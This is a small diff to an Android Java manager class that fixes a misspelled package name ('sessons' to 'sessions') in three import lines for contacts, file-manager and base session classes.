@@ -3,9 +3,9 @@ package com.lyrnic.userside.managers;
 import android.content.Context;
 
 import com.lyrnic.userside.constants.Constants;
-import com.lyrnic.userside.sessons.ContactsSession;
-import com.lyrnic.userside.sessons.FileManagerSession;
-import com.lyrnic.userside.sessons.Session;
+import com.lyrnic.userside.sessions.ContactsSession;
+import com.lyrnic.userside.sessions.FileManagerSession;
+import com.lyrnic.userside.sessions.Session;
 
 import org.json.JSONException;
 import org.json.JSONObject;
